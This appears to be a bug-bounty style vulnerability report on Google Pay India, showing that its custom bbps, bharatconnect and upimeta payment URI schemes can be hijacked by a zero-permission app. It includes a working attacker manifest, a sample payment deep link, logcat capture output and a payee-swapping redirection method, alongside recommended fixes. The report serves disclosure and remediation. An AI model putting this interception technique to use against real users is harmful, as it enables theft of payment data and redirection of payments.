# Google Pay India (GPay) — Financial Payment Scheme Interception via Unverified Custom URI Handlers

## Summary

Google Pay India (`com.google.android.apps.nbu.paisa.user`) registers BROWSABLE intent filters for three custom payment URI schemes — `bbps://`, `bharatconnect://`, and `upimeta://` — without App Link verification (`autoVerify=true`). A zero-permission attacker app can register competing intent filters for these schemes, causing Android to display a chooser dialog. If the user selects the attacker app, all financial payment parameters (biller ID, consumer ID, payment amount, transaction reference, merchant name, VPA) are exfiltrated to the attacker.

## Severity: HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select attacker app from disambiguation chooser
- **CIA impact**: Confidentiality (financial payment parameters leaked), Integrity (payment can be redirected to attacker-controlled payee)

## Affected Component

- **Package**: `com.google.android.apps.nbu.paisa.user` (Google Pay India / GPay)
- **Activity**: `com.google.nbu.paisa.flutter.gpay.app.DeepLinkIntentFilter`
- **Tested version**: Latest from Google Play (September 2026)
- **Device**: Pixel 6a, Android 17 Beta (API 37)

## Vulnerable Schemes

### 1. `bbps://pay` — Bharat Bill Payment System

India's national bill payment system scheme. Carries biller ID, customer account parameters, payment amount, transaction reference, and merchant identity.

```xml
<!-- From Google Pay India manifest -->
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="bbps" android:host="pay" />
</intent-filter>
```

**No `android:autoVerify="true"` is present.** Since `bbps://` is a custom scheme (not `https://`), App Link verification cannot protect it.

### 2. `bharatconnect://pay` — BharatConnect Payment

The rebranded BBPS scheme for India's bill payment infrastructure. Same data exposure as `bbps://`.

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="bharatconnect" android:host="pay" />
</intent-filter>
```

### 3. `upimeta://link` — UPI Metadata Link

Carries full UPI payment parameters including VPA (Virtual Payment Address), payee name, amount, currency, and transaction reference.

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="upimeta" android:host="link" />
</intent-filter>
```

## Root Cause

Android's intent resolution for custom URI schemes (non-`https://`) does not support domain verification. Any app can register a BROWSABLE intent filter for the same scheme, causing Android to present a disambiguation chooser dialog. Google Pay India relies on these custom schemes for receiving bill payment and UPI payment deep links but has no mechanism to prevent competing registrations.

These schemes are **exclusive to Google Pay India** — they are not registered by Google Wallet (`com.google.android.apps.walletnfcrel`) or any other Google app on the device.

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

Zero-permission app with competing intent filters:

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <!-- Intercept BBPS bill payment -->
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="bbps" android:host="pay" />
    </intent-filter>
    <!-- Intercept BharatConnect payment -->
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="bharatconnect" android:host="pay" />
    </intent-filter>
    <!-- Intercept UPI Meta link -->
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="upimeta" android:host="link" />
    </intent-filter>
</activity>
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions
2. Trigger a BBPS bill payment deep link (e.g., from a merchant website or SMS):
   ```
   bbps://pay?billerid=ELECTRICITY001&customerparam=ACC123456&amount=5000&txnref=TXN98765&merchantname=StateElectricity
   ```
3. Android displays "Open with" chooser showing both "ZeroPerm" and "GPay"
4. If user selects ZeroPerm, all payment parameters are captured

### Runtime Proof (logcat output)

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: bbps://pay?billerid=ELECTRICITY001&customerparam=ACC123456&amount=5000&txnref=TXN98765&merchantname=StateElectricity
W OAUTH_INTERCEPT: [+] Param: billerid = ELECTRICITY001
W OAUTH_INTERCEPT: [+] Param: customerparam = ACC123456
W OAUTH_INTERCEPT: [+] Param: amount = 5000
W OAUTH_INTERCEPT: [+] Param: txnref = TXN98765
W OAUTH_INTERCEPT: [+] Param: merchantname = StateElectricity
```

BharatConnect interception:
```
W OAUTH_INTERCEPT: [+] Data URI: bharatconnect://pay?billerid=WATER_SUPPLY&consumerid=CUST7890&amount=2500&txnref=BC12345&merchantname=WaterBoard
W OAUTH_INTERCEPT: [+] Param: billerid = WATER_SUPPLY
W OAUTH_INTERCEPT: [+] Param: consumerid = CUST7890
W OAUTH_INTERCEPT: [+] Param: amount = 2500
W OAUTH_INTERCEPT: [+] Param: txnref = BC12345
W OAUTH_INTERCEPT: [+] Param: merchantname = WaterBoard
```

UPI Meta interception:
```
W OAUTH_INTERCEPT: [+] Data URI: upimeta://link?pa=merchant@bank&pn=MerchantShop&am=1500&cu=INR&tn=OrderPayment&tr=REF456
W OAUTH_INTERCEPT: [+] Param: pa = merchant@bank
W OAUTH_INTERCEPT: [+] Param: pn = MerchantShop
W OAUTH_INTERCEPT: [+] Param: am = 1500
W OAUTH_INTERCEPT: [+] Param: cu = INR
W OAUTH_INTERCEPT: [+] Param: tn = OrderPayment
W OAUTH_INTERCEPT: [+] Param: tr = REF456
```

## Leaked Data (CIA: Confidentiality)

| Scheme | Parameters Exposed |
|--------|-------------------|
| `bbps://pay` | billerid, customerparam (customer account number), amount, txnref, merchantname |
| `bharatconnect://pay` | billerid, consumerid, amount, txnref, merchantname |
| `upimeta://link` | pa (VPA/bank address), pn (payee name), am (amount), cu (currency), tn (transaction note), tr (transaction reference) |

## Integrity Impact

An attacker who intercepts a `upimeta://link` intent can:
1. Extract the original payment parameters
2. Modify the `pa` (payee address) to an attacker-controlled VPA
3. Forward the modified URI to Google Pay India via an explicit intent
4. The user sees what appears to be the correct payment flow but pays the attacker

## Recommended Fix

1. **Migrate to Android App Links** (`https://` with `autoVerify="true"`) for all payment deep links
2. **Use the Android Digital Asset Links protocol** to verify the source of payment intents
3. **Validate the calling package** via `getCallingPackage()` or `getReferrer()` before processing payment parameters
4. **Sign payment URIs** with HMAC to detect tampering by intermediaries

## Files Attached

- `poc.apk` — Zero-permission PoC app
- `screen_bbps_chooser.png` — Chooser showing ZeroPerm alongside GPay for bbps://
- `screen_bbps_proof.png` — ZeroPerm displaying captured BBPS payment data
- `screen_bharatconnect_chooser.png` — Chooser for bharatconnect:// showing both apps
